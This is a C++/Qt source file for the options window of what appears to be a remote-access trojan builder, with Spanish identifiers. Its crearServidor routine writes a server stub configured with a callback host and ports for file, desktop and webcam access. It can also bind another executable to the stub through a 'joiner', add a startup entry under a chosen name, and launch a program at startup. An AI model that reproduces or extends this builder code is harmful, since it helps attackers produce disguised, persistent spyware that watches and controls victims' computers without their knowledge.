/*
 *  Copyright (C) 2010 Alberto Pajuelo Montes <paju1986@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor,
 *  Boston, MA 02110-1301, USA.
 */

#include "ventanaopciones.h"
#include "ui_ventanaopciones.h"

ventanaOpciones::ventanaOpciones(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::ventanaOpciones)
{
    ui->setupUi(this);
    this->setGeometry(100,100,this->width(),this->minimumHeight());
    connect(ui->botonCrearServidor,SIGNAL(clicked()),this,SLOT(crearServidor()));
    connect(ui->checkJoiner,SIGNAL(clicked()),this,SLOT(activarJoiner()));
    connect(ui->checkEjecutar,SIGNAL(clicked()),this,SLOT(activarEjecucion()));
    connect(ui->checkInicio,SIGNAL(clicked()),this,SLOT(activarInicio()));
    connect(ui->botonExaminar,SIGNAL(clicked()),this,SLOT(examinar()));
}

ventanaOpciones::~ventanaOpciones()
{
    delete ui;
}

void ventanaOpciones::changeEvent(QEvent *e)
{
    QMainWindow::changeEvent(e);
    switch (e->type()) {
    case QEvent::LanguageChange:
        ui->retranslateUi(this);
        break;
    default:
        break;
    }
}
void ventanaOpciones::examinar()
{
    ui->textoEjecutable->setText(QFileDialog::getOpenFileName(this,"Abrir ejecutable"));
}
void ventanaOpciones::activarJoiner()
{
    if(ui->checkJoiner->isChecked()) {
        ui->botonExaminar->setEnabled(true);
        ui->textoEjecutable->setEnabled(true);
        ui->label_9->setEnabled(true);
    }
    else
    {
        ui->botonExaminar->setEnabled(false);
        ui->textoEjecutable->setEnabled(false);
        ui->label_9->setEnabled(false);
    }
}
void ventanaOpciones::activarEjecucion()
{
    if(ui->checkEjecutar->isChecked())
    {
        ui->label_11->setEnabled(true);
        ui->textoEjecutar->setEnabled(true);
        ui->groupOpciones->setEnabled(true);
    }
    else
    {
        ui->label_11->setEnabled(false);
        ui->textoEjecutar->setEnabled(false);
        ui->groupOpciones->setEnabled(false);
    }
}
void ventanaOpciones::activarInicio()
{
    if(ui->checkInicio->isChecked())
    {
        ui->textoNombre->setEnabled(true);
        ui->label_10->setEnabled(true);
    }
    else
    {
        ui->textoNombre->setEnabled(false);
        ui->label_10->setEnabled(false);
    }
}
void ventanaOpciones::crearServidor()
{
    if (QFile::exists("rawserver.dat"))
    {
        QByteArray datos;
        QFile rawserver;
        QFile server;
        datos = "|@|" + ui->textoHost->text().toLatin1() + "|@|";
        datos = datos + ui->textoPuerto->text().toLatin1() + "|@|";
        datos = datos + ui->textoPuertoArchivos->text().toLatin1() + "|@|";
        datos = datos + ui->textoPuertoEscritorio->text().toLatin1() + "|@|";
        datos = datos + ui->textoPuertoWebcam->text().toLatin1() + "|@|";
        datos = datos + ui->textoTiempo->text().toLatin1() + "|@|";
        datos = datos + ui->textoAlias->text().toLatin1() + "|@|";
        rawserver.setFileName("rawserver.dat");
        server.setFileName(QFileDialog::getSaveFileName(this,"Nombre del servidor"));
        rawserver.open(QIODevice::ReadOnly);
        server.open(QIODevice::WriteOnly);
        server.write(rawserver.readAll());
        if (ui->checkJoiner->isChecked())
        {
            QFile adjunto;
            QString tamano;
            adjunto.setFileName(ui->textoEjecutable->text());
            adjunto.open(QFile::ReadOnly);
            tamano.setNum(adjunto.size());
            datos = datos + "unido|@|" + tamano.toLatin1() + "|@|";
            server.write(adjunto.readAll());
        }
        else
        {
            datos = datos + "nounido|@|0|@|";
        }
        if(ui->checkInicio->isChecked()) //Si se quiere que se inicie con el sistema
        {
            datos = datos + ui->textoNombre->text().toLatin1() + "|@|";
        }
        else
        {
            datos = datos + "noiniciar|@|";
        }

        if(ui->checkEjecutar->isChecked()) //Si se quiere ejecutar un programa al inicio
        {
            datos = datos + ui->textoEjecutar->text().toLatin1() + "|@|";
        }
        else
        {
            datos = datos + "noejecutar|@|";
        }
        if(ui->radioUnaVez->isChecked()) //Si solo se ejecuta una vez el programa
        {
            datos = datos + "1|@|" ;
        }
        else
        {
            datos = datos + "0|@|";
        }
        server.write(datos,1024);
    }
    else
    {
        util.ventanaEmergente(tr("<p>No se ha podido encontrar el archivo <b>rawserver.dat</b></p><p>Este archivo es una im�gen del servidor compilado sin configurar,<br>es posible que <b>no se haya compilado el servidor</b> o que no est� en el mismo directorio del cliente con el nombre rawserver.dat</p>"));
    }
}
